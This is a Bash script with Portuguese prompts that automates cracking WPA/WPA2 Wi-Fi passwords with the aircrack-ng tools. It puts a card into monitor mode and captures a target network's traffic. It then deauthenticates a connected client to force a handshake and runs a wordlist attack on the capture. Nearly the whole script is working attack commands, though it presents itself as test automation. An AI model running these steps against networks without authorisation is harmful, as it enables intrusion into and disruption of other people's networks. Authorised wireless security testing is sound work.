
clear
echo ""
echo ""
echo "  Automatizacao de testes em redes Wifi WPA/WPA2"
echo "  ftm.fernando@gmail.com"
echo "  @t1pg2f"
echo "  Execute como ROOT!"
#
Wifi() {
    echo "  -----------------------------------------------"
    echo "  Menu:"
    echo "  -----------------------------------------------"
    echo "  1 - Setar variaveis"
    echo "  2 - Ativar modo monitoramente e Snnifer na placa Wifi"
    echo "  3 - Ativar injecao de pacotes"
    echo "  4 - Quebrar Senha"
    echo "  5 - Exit"
    echo
    echo -n "   Digite a opcao:  "
    read opcao
    case $opcao in
    1) Seta_Var ;;
    2) Snnifer ;;
    3) Inject ;;
    4) Crack ;;
    5) Exit ;;
    *) "    Opcao desconhecida." ; echo ; Wifi ;;
    esac
    }
    Seta_Var(){
        echo "  1 - Setar interface Wifi"
        echo "  2 - Setar diretorio captura"
        echo "  3 - Setar wordlist"
        echo "  4 - Verificar parametros setados"
        echo "  5 - Voltar ao Menu principal"
        echo -n  "  Digite uma opcao:  "
        read opcao_var
        if [ $opcao_var = 1 ]; then
        sleep 1
        airmon-ng
        echo "  Entre com o nome da interface Wifi:  "
        read interface
        clear
        Seta_Var
        elif [ $opcao_var = 2 ]; then
        echo -n "   Entre com o diretorio para salvar a coleta de pacotes:  "
        read dirpacotes
            if [ ! -d "$dirpacotes" ]; then
 
echo "  Diretorio nao existe, criando diretorio..."
            sleep 3
            echo "  ."
            echo "  .."
            echo "  ..."
            mkdir $dirpacotes
            chmod 777 -R $dirpacotes/
            fi
            sleep 1
            clear
        Seta_Var
        elif [ $opcao_var = 3 ]; then
        echo -n "   Entre com o caminho absoluto da Wordlist, ex /home/wordlist.txt:  "
        read wordlist
            if [ ! -e "$wordlist" ]; then
            sleep 3
            echo "  Wordlist nao existe ou foi digitada incorretamente"
            fi
        clear
        Seta_Var
        elif [ $opcao_var = 4 ]; then
        echo "  interface Wifi: $interface"
        echo "  Diretorio Captura: $dirpacotes"
        echo "  Worlist: $wordlist"
        sleep 6
        clear
        Seta_Var
        elif [ $opcao_var = 5 ]; then
        Wifi
    fi
        }
        Snnifer() {
        airmon-ng start $interface
        echo -n "   Deseja matar algum processo que esteja usando o Wifi?: [y/n] "
        read kill_var
        if [ $kill_var = y ]; then
        echo "  Digite o pid do processo:  "
        read pidkill
        kill -9 $pidkill
        fi
        clear
        airmon-ng start $interface > /tmp/wifidump
        cat /tmp/wifidump
        echo  " Entre com o nome da interface de monitoramento, ex wlan0mon:  "
        read mon_interface
        clear
        echo "  Precione: ctrl + c uma vez assim que aparecer o BSSID e o client STATION da rede que voce precisa.."
        sleep 8
        airodump-ng $mon_interface
        echo "  Analise a rede wifi a ser quebrada e entre com os dados exatamente como aparecem:  "
        echo "  Digite o BSSID da rede desejada:  "
        read bssid
        echo "  Digite o Canal, campo CH:  "
        read canal
        echo "  Digite o client, mac do  pc que esta na rede:  "
        read client
        echo "  Executando Snnifer..."
        gnome-terminal -x bash -c "airodump-ng -c $canal --bssid $bssid -w $dirpacotes/ $mon_interface"
        sleep 5
        Wifi
            }
        Inject() {
        aireplay-ng -0 2 -a $bssid -c $client $mon_interface
        sleep 10
        Wifi
            }
        Crack() {
        clear
        echo "  Crakeando senha, isso pode demorar um pouco..."
        aircrack-ng -a2 -b $bssid -w $wordlist $dirpacotes/*.cap
        sleep 5
 
        Wifi
            }
        Exit() {
        exit 0
}
Wifi
